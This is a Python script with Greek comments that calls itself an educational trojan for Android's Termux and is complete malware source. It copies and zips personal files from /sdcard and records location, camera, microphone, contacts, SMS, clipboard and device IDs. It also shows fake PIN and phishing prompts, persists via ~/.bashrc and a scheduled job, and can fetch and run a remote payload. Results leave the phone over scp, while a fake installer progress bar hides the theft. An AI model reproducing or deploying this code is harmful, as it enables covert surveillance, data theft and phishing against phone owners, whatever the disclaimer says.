#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Trojan.py – Πλήρως εξοπλισμένο trojan για Termux χωρίς root (ΜΟΝΟ ΓΙΑ ΕΚΠΑΙΔΕΥΤΙΚΗ ΧΡΗΣΗ)
Αυτόματη εγκατάσταση εξαρτήσεων, συλλογή όλων των δεδομένων, κλοπή αρχείων από το /sdcard,
αποθήκευση στο /sdcard/Download/Troy/ και εξαγωγή μέσω SSH εάν έχει ρυθμιστεί.
"""

import os
import sys
import subprocess
import time
import json
import threading
import shutil
import zipfile
from datetime import datetime
import signal

# ==================================================================
#  ΡΥΘΜΙΣΕΙΣ – ΣΥΜΠΛΗΡΩΣΤΕ ΓΙΑ ΕΞΑΓΩΓΗ ΜΕ SSH
# ==================================================================

SSH_HOST = ""          # π.χ. "192.168.1.100"
SSH_USER = ""          # π.χ. "lab"
SSH_KEY_PATH = ""      # π.χ. "/sdcard/id_rsa" (ιδιωτικό κλειδί)
REMOTE_PATH = ""       # π.χ. "/home/lab/harvest/"

SMS_RECIPIENT = "1234567890"   # αλλάξτε με έναν δοκιμαστικό αριθμό

# Όρια κλοπής αρχείων – προσαρμόστε αν θέλετε
MAX_TOTAL_SIZE_MB = 20480      # 20 GB (20 * 1024)
MAX_FILE_SIZE_MB = 50          # παράβλεψη αρχείων >50 MB
# Δεν υπάρχει όριο στον αριθμό αρχείων – σταματά όταν φτάσει το συνολικό μέγεθος.

# Ενεργοποίηση λήψης και εκτέλεσης επιπλέον ωφέλιμου κώδικα (βάλτε True και δώστε URL)
DOWNLOAD_PAYLOAD = False
PAYLOAD_URL = ""       # π.χ. "http://your-server/payload.sh"

# URL για ψεύτικη σελίδα phishing (ανοίγει σε πρόγραμμα περιήγησης)
PHISHING_URL = "https://example.com/fake-login"   # αλλάξτε με τον δικό σας σύνδεσμο

# Αν τα πεδία SSH είναι κενά, το script θα αποθηκεύσει μόνο τοπικά.

# ==================================================================
#  ΑΥΤΟΜΑΤΗ ΕΓΚΑΤΑΣΤΑΣΗ ΕΞΑΡΤΗΣΕΩΝ
# ==================================================================

def install_python_packages():
    """Εγκατάσταση απαιτούμενων πακέτων Python μέσω pip."""
    required = []   # Δεν χρειαζόμαστε εξωτερικά πακέτα
    for pkg in required:
        try:
            __import__(pkg)
        except ImportError:
            print(f"[*] Εγκατάσταση πακέτου Python: {pkg}")
            subprocess.run([sys.executable, "-m", "pip", "install", pkg], check=False)

def install_termux_addons():
    """Εγκατάσταση των termux-api και openssh μέσω pkg (μη διαδραστικά)."""
    if not shutil.which("termux-location"):
        print("[*] Εγκατάσταση termux-api (wrapper) ...")
        subprocess.run("pkg install termux-api -y", shell=True, check=False)
    if not shutil.which("scp"):
        print("[*] Εγκατάσταση openssh ...")
        subprocess.run("pkg install openssh -y", shell=True, check=False)
    # Προσπάθεια εγκατάστασης του termux-job-scheduler (προαιρετικό)
    if not shutil.which("termux-job-scheduler"):
        print("[*] Εγκατάσταση termux-job-scheduler (προαιρετικό) ...")
        subprocess.run("pkg install termux-job-scheduler -y", shell=True, check=False)

install_python_packages()
install_termux_addons()

def check_termux_api_app():
    """Προειδοποίηση αν λείπει η εφαρμογή Termux:API."""
    try:
        subprocess.run("termux-location --help", shell=True, capture_output=True, timeout=2)
    except Exception:
        print("\n[!] ΠΡΟΕΙΔΟΠΟΙΗΣΗ: Η εφαρμογή Termux:API μπορεί να μην είναι εγκατεστημένη.")
        print("    Παρακαλώ εγκαταστήστε την από το F-Droid ή το Google Play.")
        print("    Διαφορετικά, πολλές εντολές θα αποτύχουν.\n")
        time.sleep(2)

check_termux_api_app()

# ==================================================================
#  ΒΟΗΘΗΤΙΚΕΣ ΣΥΝΑΡΤΗΣΕΙΣ
# ==================================================================

def run_cmd(cmd, timeout=10):
    try:
        proc = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return proc.stdout.strip(), proc.stderr.strip(), proc.returncode
    except subprocess.TimeoutExpired:
        return "", "TIMEOUT", -1
    except Exception as e:
        return "", str(e), -2

def ensure_dir(path):
    os.makedirs(path, exist_ok=True)

def get_safe_storage_dir():
    primary = "/sdcard/Download/Troy"
    try:
        ensure_dir(primary)
        test_file = os.path.join(primary, ".write_test")
        with open(test_file, "w") as f:
            f.write("test")
        os.remove(test_file)
        return primary
    except Exception:
        fallback = os.path.expanduser("~/Troy")
        ensure_dir(fallback)
        return fallback

# ==================================================================
#  ΚΛΟΠΗ ΑΡΧΕΙΩΝ – ΑΝΑΔΡΟΜΙΚΗ ΑΝΤΙΓΡΑΦΗ ΕΝΔΙΑΦΕΡΟΝΤΩΝ ΑΡΧΕΙΩΝ (ΧΩΡΙΣ ΟΡΙΟ ΠΛΗΘΟΥΣ)
# ==================================================================

def steal_files(save_dir):
    stolen_dir = os.path.join(save_dir, "stolen")
    ensure_dir(stolen_dir)

    extensions = {
        '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp',
        '.mp4', '.mkv', '.avi', '.mov', '.3gp', '.m4v',
        '.mp3', '.wav', '.flac', '.aac', '.m4a',
        '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx',
        '.txt', '.csv', '.json', '.xml', '.html', '.htm',
        '.zip', '.rar', '.7z', '.tar', '.gz',
        '.apk',
    }

    max_total_bytes = MAX_TOTAL_SIZE_MB * 1024 * 1024
    max_file_bytes = MAX_FILE_SIZE_MB * 1024 * 1024

    copied = []
    total_copied_bytes = 0
    skipped_large = 0
    skipped_permission = 0

    skip_dirs = {os.path.abspath(save_dir), os.path.abspath(stolen_dir)}

    for root, dirs, files in os.walk("/sdcard"):
        abs_root = os.path.abspath(root)
        if any(abs_root.startswith(s) for s in skip_dirs):
            continue
        if "/Android/" in root or "/data/" in root:
            continue

        if total_copied_bytes >= max_total_bytes:
            break

        for fname in files:
            ext = os.path.splitext(fname)[1].lower()
            if ext not in extensions:
                continue
            fpath = os.path.join(root, fname)
            try:
                size = os.path.getsize(fpath)
                if size > max_file_bytes:
                    skipped_large += 1
                    continue
                if total_copied_bytes + size > max_total_bytes:
                    break
            except (PermissionError, OSError):
                skipped_permission += 1
                continue

            dest = os.path.join(stolen_dir, os.path.basename(fpath))
            base, ext = os.path.splitext(dest)
            counter = 1
            while os.path.exists(dest):
                dest = f"{base}_{counter}{ext}"
                counter += 1
            try:
                shutil.copy2(fpath, dest)
                copied.append({"original": fpath, "saved_as": dest, "size_bytes": size})
                total_copied_bytes += size
            except Exception:
                continue

            if total_copied_bytes >= max_total_bytes:
                break

    # Δημιουργία ZIP αρχείου
    zip_path = os.path.join(save_dir, "stolen_archive.zip")
    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for entry in copied:
            zipf.write(entry["saved_as"], os.path.basename(entry["saved_as"]))

    return {
        "total_copied_count": len(copied),
        "total_copied_size_mb": total_copied_bytes / (1024*1024),
        "skipped_large_files": skipped_large,
        "skipped_permission_errors": skipped_permission,
        "archive_path": zip_path,
        "file_list": copied[:20]
    }

# ==================================================================
#  ΠΡΟΣΘΕΤΕΣ ΚΑΚΟΒΟΥΛΕΣ / ΕΝΟΧΛΗΤΙΚΕΣ ΛΕΙΤΟΥΡΓΙΕΣ
# ==================================================================

def set_clipboard_phishing():
    """Αντικατάσταση του clipboard με μήνυμα phishing."""
    msg = "⚠️ Συναγερμός Ασφαλείας: Παρακαλώ επιβεβαιώστε τον λογαριασμό σας στο https://example.com/verify"
    out, err, code = run_cmd(f'termux-clipboard-set "{msg}"')
    return {"clipboard_set": code == 0, "error": err}

def open_phishing_url():
    """Άνοιγμα URL phishing στο προεπιλεγμένο πρόγραμμα περιήγησης."""
    cmd = f'termux-open-url "{PHISHING_URL}"'
    out, err, code = run_cmd(cmd)
    return {"url_opened": code == 0, "error": err}

def send_persistent_notification():
    """Εμφάνιση ειδοποίησης που ανοίγει το URL phishing όταν πατηθεί."""
    cmd = f'termux-notification -t "Απαιτείται Ενημέρωση Ασφαλείας" -c "Πατήστε για να επιβεβαιώσετε τον λογαριασμό σας" --action "{PHISHING_URL}"'
    out, err, code = run_cmd(cmd)
    return {"notification_sent": code == 0, "error": err}

def vibrate_device(duration=500):
    """Δόνηση για διάρκεια χιλιοστά του δευτερολέπτου."""
    out, err, code = run_cmd(f"termux-vibration -d {duration}")
    return {"vibrated": code == 0, "error": err}

def flash_torch(times=3, duration=200):
    """Αναβοσβήσιμο φακού μερικές φορές."""
    for _ in range(times):
        run_cmd("termux-torch on", timeout=1)
        time.sleep(duration/1000.0)
        run_cmd("termux-torch off", timeout=1)
        time.sleep(0.1)
    return {"torch_flashed": True}

def set_scary_wallpaper():
    """Λήψη τρομακτικής εικόνας και ορισμός ως ταπετσαρία."""
    wallpaper_url = "https://example.com/scary.jpg"   # αντικαταστήστε με πραγματική εικόνα
    dest = os.path.join(get_safe_storage_dir(), "wallpaper.jpg")
    cmd = f"curl -s -o {dest} {wallpaper_url}"
    out, err, code = run_cmd(cmd, timeout=15)
    if code == 0 and os.path.exists(dest):
        set_cmd = f"termux-wallpaper -f {dest}"
        out2, err2, code2 = run_cmd(set_cmd)
        return {"wallpaper_set": code2 == 0, "error": err2}
    return {"wallpaper_set": False, "error": err or "αποτυχία λήψης"}

def show_toast_message():
    """Εμφάνιση ψεύτικου μηνύματος toast."""
    out, err, code = run_cmd('termux-toast -b "Το σύστημα έχει παραβιαστεί! Επικοινωνήστε με τον διαχειριστή."')
    return {"toast_shown": code == 0, "error": err}

def wifi_scan():
    """Λίστα κοντινών δικτύων Wi‑Fi (απαιτεί άδεια τοποθεσίας)."""
    out, err, code = run_cmd("termux-wifi-scaninfo")
    if code == 0 and out:
        try:
            return json.loads(out)
        except:
            return {"raw": out[:500]}
    return {"error": err or "αποτυχία σάρωσης Wi-Fi"}

def audio_info():
    """Λήψη κατάστασης ήχου (π.χ. σίγαση μικροφώνου)."""
    out, err, code = run_cmd("termux-audio-info")
    if code == 0 and out:
        try:
            return json.loads(out)
        except:
            return {"raw": out}
    return {"error": err}

def schedule_recurring_job():
    """
    Προγραμματισμός επαναλαμβανόμενης εκτέλεσης του script κάθε 6 ώρες
    μέσω του termux-job-scheduler (απαιτεί το πρόσθετο, μπορεί να μη λειτουργεί παντού).
    """
    script_path = os.path.abspath(__file__)
    cmd = f'termux-job-scheduler -s "python {script_path}" -p 21600'
    out, err, code = run_cmd(cmd)
    return {"job_scheduled": code == 0, "error": err}

def open_archive_with_share():
    """Άνοιγμα του αρχείου ZIP μέσω του μενού κοινής χρήσης του Android."""
    zip_path = os.path.join(get_safe_storage_dir(), "stolen_archive.zip")
    if os.path.exists(zip_path):
        out, err, code = run_cmd(f'termux-share "{zip_path}"')
        return {"shared": code == 0, "error": err}
    return {"shared": False, "error": "το αρχείο ZIP δεν βρέθηκε"}

# ==================================================================
#  ΣΥΛΛΟΓΗ ΔΕΔΟΜΕΝΩΝ (ΑΡΧΙΚΕΣ ΣΥΝΑΡΤΗΣΕΙΣ)
# ==================================================================

def harvest_location():
    out, err, code = run_cmd("termux-location")
    if code == 0 and out:
        try:
            return json.loads(out)
        except:
            return {"raw": out}
    return {"error": err or "η άδεια τοποθεσίας απορρίφθηκε"}

def harvest_photo(save_dir):
    path = os.path.join(save_dir, "photo.jpg")
    out, err, code = run_cmd(f"termux-camera-photo {path}")
    if code == 0:
        size = os.path.getsize(path) if os.path.exists(path) else 0
        return {"saved_to": path, "size_bytes": size}
    return {"error": err or "η κάμερα δεν είναι διαθέσιμη"}

def harvest_audio(save_dir, duration=5):
    path = os.path.join(save_dir, "audio.m4a")
    out, err, code = run_cmd(f"termux-microphone-record -d {duration} -f {path}")
    if code == 0:
        return {"saved_to": path, "duration": duration}
    return {"error": err or "το μικρόφωνο δεν είναι διαθέσιμο"}

def harvest_clipboard():
    out, err, code = run_cmd("termux-clipboard-get")
    if code == 0:
        return {"clipboard": out[:500]}
    return {"clipboard": None, "error": err}

def harvest_contacts():
    out, err, code = run_cmd("termux-contact-list")
    if code == 0 and out:
        try:
            return json.loads(out)
        except:
            return {"raw": out[:500]}
    return {"error": err or "οι επαφές απορρίφθηκαν"}

def harvest_sms_inbox():
    out, err, code = run_cmd("termux-sms-list")
    if code == 0 and out:
        try:
            return json.loads(out)[:20]
        except:
            return {"raw": out[:500]}
    return {"error": err or "η άδεια SMS απορρίφθηκε"}

def send_test_sms(recipient):
    msg = f"Δοκιμή από Termux στις {datetime.now()}"
    out, err, code = run_cmd(f'termux-sms-send -n {recipient} "{msg}"')
    return {"success": code == 0, "error": err}

def harvest_sensors():
    out, err, code = run_cmd("termux-sensor -s 1")
    if code == 0 and out:
        try:
            return json.loads(out)
        except:
            return {"raw": out[:500]}
    return {"error": err or "η άδεια αισθητήρων απορρίφθηκε"}

def harvest_battery():
    out, err, code = run_cmd("termux-battery-status")
    if code == 0 and out:
        try:
            return json.loads(out)
        except:
            return {"raw": out}
    return {"error": err}

def harvest_wifi():
    out, err, code = run_cmd("termux-wifi-connectioninfo")
    if code == 0 and out:
        try:
            return json.loads(out)
        except:
            return {"raw": out}
    return {"error": err or "η άδεια Wi-Fi απορρίφθηκε"}

def harvest_network_info():
    out, err, code = run_cmd("ip addr show")
    if code == 0:
        return {"ip_output": out[:500]}
    out2, _, _ = run_cmd("ifconfig")
    return {"ifconfig": out2[:500] if out2 else "μη διαθέσιμο"}

def harvest_phone_info():
    out, err, code = run_cmd("termux-telephony-cellinfo")
    cell = {"error": err} if code != 0 else (json.loads(out) if out else {})
    out2, err2, code2 = run_cmd("termux-telephony-deviceinfo")
    device = {"error": err2} if code2 != 0 else (json.loads(out2) if out2 else {})
    return {"cellinfo": cell, "deviceinfo": device}

def harvest_device_properties():
    out, err, code = run_cmd("getprop ro.build.fingerprint")
    fingerprint = out if code == 0 else "άγνωστο"
    out2, err2, code2 = run_cmd("settings get secure android_id")
    android_id = out2 if code2 == 0 else "άγνωστο"
    return {"fingerprint": fingerprint, "android_id": android_id}

def phishing_dialog():
    cmd = 'termux-dialog -t "Ενημέρωση Συστήματος" -i "Εισάγετε το PIN σας για συνέχεια"'
    out, err, code = run_cmd(cmd)
    if code == 0 and out:
        try:
            return json.loads(out)
        except:
            return {"raw": out}
    return {"error": err or "το παράθυρο διαλόγου ακυρώθηκε"}

def show_notification():
    cmd = 'termux-notification -t "Συναγερμός Ασφαλείας" -c "Η συσκευή σας κινδυνεύει. Πατήστε για επιδιόρθωση."'
    out, err, code = run_cmd(cmd)
    return {"success": code == 0, "error": err}

def get_running_processes():
    out, err, code = run_cmd("ps -A | grep termux")
    return {"termux_processes": out[:500] if out else "κανένα"}

def add_persistence():
    script_path = os.path.abspath(__file__)
    bashrc = os.path.expanduser("~/.bashrc")
    marker = "# Termux persistence"
    try:
        with open(bashrc, "r") as f:
            content = f.read()
        if marker in content:
            return {"persistence": "ήδη υπάρχει"}
        with open(bashrc, "a") as f:
            f.write(f"\n{marker}\npython {script_path} &\n")
        return {"persistence": "προστέθηκε στο ~/.bashrc"}
    except Exception as e:
        return {"persistence": f"αποτυχία: {e}"}

def download_and_execute_payload():
    if not DOWNLOAD_PAYLOAD or not PAYLOAD_URL:
        return {"payload": "απενεργοποιημένο"}
    payload_path = os.path.join(get_safe_storage_dir(), "payload.sh")
    cmd_curl = f'curl -s -o {payload_path} {PAYLOAD_URL}'
    out, err, code = run_cmd(cmd_curl, timeout=20)
    if code != 0:
        return {"payload": f"αποτυχία λήψης: {err}"}
    os.chmod(payload_path, 0o755)
    run_cmd(f"bash {payload_path} &", timeout=2)
    return {"payload": "λήφθηκε και εκτελέστηκε"}

# ==================================================================
#  ΕΞΑΓΩΓΗ ΜΕ SSH
# ==================================================================

def exfiltrate_ssh(local_file):
    if not (SSH_HOST and SSH_USER and SSH_KEY_PATH and REMOTE_PATH):
        return False, "το SSH δεν έχει ρυθμιστεί"
    if not os.path.exists(SSH_KEY_PATH):
        return False, f"το κλειδί SSH δεν βρέθηκε: {SSH_KEY_PATH}"
    remote_file = os.path.join(REMOTE_PATH, os.path.basename(local_file)).replace("\\", "/")
    cmd = f'scp -i {SSH_KEY_PATH} -o StrictHostKeyChecking=no {local_file} {SSH_USER}@{SSH_HOST}:"{remote_file}"'
    out, err, code = run_cmd(cmd, timeout=30)
    if code == 0:
        return True, out
    else:
        return False, err or "αποτυχία SCP"

# ==================================================================
#  ΚΥΡΙΑ ΣΥΝΑΡΤΗΣΗ – ΣΥΛΛΟΓΗ + ΚΛΟΠΗ + ΕΝΟΧΛΗΣΗ + ΑΠΟΘΗΚΕΥΣΗ + ΕΞΑΓΩΓΗ
# ==================================================================

def do_harvest():
    base_dir = get_safe_storage_dir()
    ensure_dir(base_dir)

    # --- ΚΛΟΠΗ ΑΡΧΕΙΩΝ ---
    stolen_summary = steal_files(base_dir)

    # --- ΣΥΛΛΟΓΗ ΔΕΔΟΜΕΝΩΝ ---
    data = {
        "timestamp": datetime.now().isoformat(),
        "location": harvest_location(),
        "photo": harvest_photo(base_dir),
        "audio": harvest_audio(base_dir),
        "clipboard": harvest_clipboard(),
        "contacts": harvest_contacts(),
        "sms_inbox": harvest_sms_inbox(),
        "sms_sent": send_test_sms(SMS_RECIPIENT),
        "sensors": harvest_sensors(),
        "battery": harvest_battery(),
        "wifi_connection": harvest_wifi(),
        "wifi_scan": wifi_scan(),
        "network": harvest_network_info(),
        "phone_info": harvest_phone_info(),
        "device_properties": harvest_device_properties(),
        "audio_info": audio_info(),
        "processes": get_running_processes(),
        "phishing_dialog": phishing_dialog(),
        "notification": show_notification(),
        "persistence": add_persistence(),
        "payload": download_and_execute_payload(),
        "stolen_files_summary": stolen_summary,
        # --- ΠΡΟΣΘΕΤΕΣ ΕΝΟΧΛΗΤΙΚΕΣ ΕΝΕΡΓΕΙΕΣ ---
        "clipboard_set_phishing": set_clipboard_phishing(),
        "url_opened": open_phishing_url(),
        "persistent_notification": send_persistent_notification(),
        "vibrated": vibrate_device(800),
        "torch_flashed": flash_torch(2, 300),
        "wallpaper": set_scary_wallpaper(),
        "toast": show_toast_message(),
        "job_scheduled": schedule_recurring_job(),
        "archive_shared": open_archive_with_share(),
    }

    # Αποθήκευση JSON
    filename = f"harvest_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    filepath = os.path.join(base_dir, filename)
    with open(filepath, "w") as f:
        json.dump(data, f, indent=2)

    # Εξαγωγή με SSH (αν έχει ρυθμιστεί)
    if SSH_HOST and SSH_USER and SSH_KEY_PATH and REMOTE_PATH:
        success, msg = exfiltrate_ssh(filepath)
        with open(os.path.join(base_dir, "exfil_log.txt"), "a") as log:
            log.write(f"{datetime.now()} - {filename} -> {success}: {msg}\n")
        zip_path = stolen_summary.get("archive_path")
        if zip_path and os.path.exists(zip_path):
            success2, msg2 = exfiltrate_ssh(zip_path)
            with open(os.path.join(base_dir, "exfil_log.txt"), "a") as log:
                log.write(f"{datetime.now()} - {os.path.basename(zip_path)} -> {success2}: {msg2}\n")

    return filepath

# ==================================================================
#  ΨΕΥΤΙΚΕΣ ΓΡΑΜΜΕΣ ΠΡΟΟΔΟΥ
# ==================================================================

def fake_progress():
    messages = [
        "Λήψη termux-api 0.50.1 (1.2 MB)",
        "Αποσυμπίεση termux-api (0.50.1)",
        "Ρύθμιση termux-api (0.50.1)",
        "Λήψη openssh 9.2p1 (2.3 MB)",
        "Αποσυμπίεση openssh (9.2p1)",
        "Ρύθμιση openssh (9.2p1)",
        "Λήψη python 3.11.2 (18.5 MB)",
        "Αποσυμπίεση python (3.11.2)",
        "Ρύθμιση python (3.11.2)",
        "Λήψη requests 2.28.2 (0.5 MB)",
        "Εγκατάσταση requests (2.28.2)",
        "Λήψη termux-api-extra (0.3 MB)",
        "Αποσυμπίεση termux-api-extra",
        "Λήψη termux-job-scheduler (0.1 MB)",
        "Αποσυμπίεση termux-job-scheduler",
        "Εκτέλεση μετεγκαταστατικών ενεργειών",
        "Εκκαθάριση προσωρινής μνήμης πακέτων",
        "Όλα τα πακέτα εγκαταστάθηκαν με επιτυχία.",
    ]
    total = len(messages)
    print("\n" + "=" * 50)
    print("Διαχειριστής πακέτων Termux")
    print("Ενημέρωση αποθετηρίων...")
    print("=" * 50)

    for i, msg in enumerate(messages):
        progress = int((i / total) * 20)
        bar = "#" * progress + "-" * (20 - progress)
        percent = int((i / total) * 100)
        time.sleep(0.2 + (0.3 * (i % 4)))
        sys.stdout.write(f"\r[{bar}] {percent}% - {msg:<35}")
        sys.stdout.flush()

    sys.stdout.write(f"\r[{'#' * 20}] 100% - Ολοκληρώθηκε.\n")
    sys.stdout.flush()
    time.sleep(0.5)

# ==================================================================
#  ΚΥΡΙΑ ΕΚΤΕΛΕΣΗ
# ==================================================================

def main():
    def signal_handler(sig, frame):
        print("\n[!] Διακοπή. Έξοδος.")
        sys.exit(0)
    signal.signal(signal.SIGINT, signal_handler)

    print("\n[!] Αυτό το script είναι μόνο για εκπαιδευτικούς σκοπούς.")
    print("[!] Συλλέγει δεδομένα και αρχεία από τη συσκευή σας και μπορεί να τα αποστείλει αν έχει ρυθμιστεί SSH.\n")

    harvest_thread = threading.Thread(target=do_harvest, daemon=True)
    harvest_thread.start()

    fake_progress()

    print("\n[+] Ολοκλήρωση εργασιών παρασκηνίου...")
    harvest_thread.join()

    storage_dir = get_safe_storage_dir()
    print(f"\n[+] Η λειτουργία ολοκληρώθηκε. Ελέγξτε το {storage_dir} για τα αποτελέσματα.")
    print("[!] Αυτό το script είναι μόνο για εκπαιδευτικούς σκοπούς.\n")

if __name__ == "__main__":
    main()